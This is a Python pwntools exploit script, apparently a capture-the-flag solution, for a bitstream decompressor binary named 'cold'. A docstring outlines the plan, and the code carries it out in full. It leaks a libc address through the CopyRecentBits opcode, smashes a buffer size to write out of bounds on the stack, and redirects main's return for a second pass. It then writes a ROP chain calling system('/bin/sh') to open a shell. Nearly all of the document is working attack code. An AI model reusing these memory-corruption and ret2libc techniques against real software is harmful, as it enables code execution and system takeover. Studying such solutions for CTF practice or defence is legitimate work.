#!/usr/bin/env python3
import binascii
from pwn import *

context.log_level = "debug"

"""
There are bugs all over here, but CopyRecentBits is the best.

Basic exploit strategy:
1) copy a libc pointer (there's one into _int_malloc nearby) from lower on the stack into the output buffer
2) copy some long length into the output backing_store.size.
3) Now that we can go OOB without aborting in the decompress loop, seek forwards to the return address from main on the stack. Overwrite just the low bits with the offset of main, in order to give us a second go 
4) exit the decompression loop. This will print the pointer in the buffer from step 1, then return and execute main again
5) Do the same thing to overwrite the backing_store.size, and now we can rop in libc (or use the bespoke gadget) to get all the way through

There are other ways to do this too: For example, you could skip leaking an address in the output buffer, and instead smash the size and then assemble a libc pointer directly by copying one that's already on the stack, then updating the low bits to point at what you want. That way feels like even more work though. It does have the advantage of being one-shot, however
"""


# Offsets
# _int_malloc in libc
int_malloc_libc_offset = 0x89690
# We leak an address from the stack inside _int_malloc. This is how far offset from _int_malloc it is.
int_malloc_symbol_leak_libc_offset = 3374
# offset of system in libc
system_libc_offset = 0x49DE0
# offset of a pop rdi ; ret in libc
pop_rdi_libc_offset = 0x27F75
# offset of the string "/bin/sh" in libc
binsh_libc_offset = 0x18BB62


class Opcode:
    Done = 0
    EmitBit = 1
    EmitByte = 2
    CopyRecentBits = 3
    Seek = 4


def bits(x, n):
    enc = bin(x)[2:]
    if len(enc) > n:
        raise ValueError()
    return enc.rjust(n, "0")


def encode_bitstream(bs):
    # pad the bitstream to be byte-aligned
    while len(bs) % 8 != 0:
        bs += "0"

    result = b""
    for i in range(0, len(bs), 8):
        result += int(bs[i : i + 8][::-1], 2).to_bytes(1, "little")
    return result


p = process("./cold")
pause()

bs = ""
# output size (must be 15 bytes or smaller to get stack-allocated std::string output)
bs += bits(15, 20)

# This copies the address <_int_malloc+3374> to our output buffer
bs += bits(Opcode.CopyRecentBits, 3)  # opcode
bs += bits(48 * 8 + 7, 10)  # offset
bs += bits(8 * 8, 10)  # length

# now we want to seek to the end, and we'll write a byte there, which will make the output.backing_store.size larger
bs += bits(Opcode.Seek, 3)  # opcode
bs += bits(7 * 8 - 1, 16)  # nbits

# now, let's copy some data to smash output.backing_store.size
bs += bits(Opcode.CopyRecentBits, 3)  # opcode
bs += bits(16 * 8, 10)  # offset
bs += bits(64, 10)  # length

# we can write OOB now, up the stack.
# The return to __libc_start_main is 80 bytes up the stack from the output buffer.
bs += bits(Opcode.Seek, 3)  # opcode
bs += bits(80 * 8 - 183, 16)  # offset

# now, let's overwrite the return address.
# Fortunately, a pointer to _start is just 24 bytes before us on the stack!
bs += bits(Opcode.CopyRecentBits, 3)
bs += bits(24 * 8, 10)  # offset
bs += bits(64, 10)  # length

# And finally, tell the decompressor that we're done
bs += bits(Opcode.Done, 3)

encoded = encode_bitstream(bs)
encoded = encoded.ljust(64, b"\0")

p.readline()
p.send(encoded)

p.recvuntil("Output: ")
leak_raw = p.readline()[:-1]
print(f"raw leak: {leak_raw}")
leak = leak_raw.ljust(8, b"\0")
# bytes in leak are rotated right by 1 because get_bit/set_bit are not intended for negative numbers. rotate them left by 1 to compensate
rol1 = lambda x: ((x << 1) | (x >> 7)) & 0b1111_1111
leak = u64(bytes(rol1(byte) for byte in leak))

libc_base = leak - (int_malloc_libc_offset + int_malloc_symbol_leak_libc_offset)

print(f"libc base: {libc_base:#x}")

# Part 2 is basically copy-pasted, except the end


bs = ""
# output size (must be 15 bytes or smaller to get stack-allocated std::string output)
bs += bits(15, 20)

# This copies the address <_int_malloc+3374> to our output buffer
bs += bits(Opcode.CopyRecentBits, 3)  # opcode
bs += bits(48 * 8 + 7, 10)  # offset
bs += bits(8 * 8, 10)  # length

# now we want to seek to the end, and we'll write a byte there, which will make the output.backing_store.size larger
bs += bits(Opcode.Seek, 3)  # opcode
bs += bits(7 * 8 - 1, 16)  # nbits

# now, let's copy some data to smash output.backing_store.size
bs += bits(Opcode.CopyRecentBits, 3)  # opcode
bs += bits(16 * 8, 10)  # offset
bs += bits(64, 10)  # length

# we can write OOB now, up the stack.
# The return to __libc_start_main is 80 bytes up the stack from the output buffer.
bs += bits(Opcode.Seek, 3)  # opcode
bs += bits(80 * 8 - 183, 16)  # offset


ropchain = b""
ropchain += p64(libc_base + pop_rdi_libc_offset)
ropchain += p64(libc_base + binsh_libc_offset)
ropchain += p64(libc_base + system_libc_offset)
ropchain += p64(0xDEADBEEF_CAFEBABE)

# now, let's overwrite the return address.
# we'll just directly write out a ropchain onto the stack.
for byte in ropchain:
    bs += bits(Opcode.EmitByte, 3)
    bs += bits(byte, 8)  # byte

# And finally, tell the decompressor that we're done
bs += bits(Opcode.Done, 3)

encoded = encode_bitstream(bs)
encoded = encoded.ljust(64, b"\0")

p.readline()
p.send(encoded)

p.interactive()
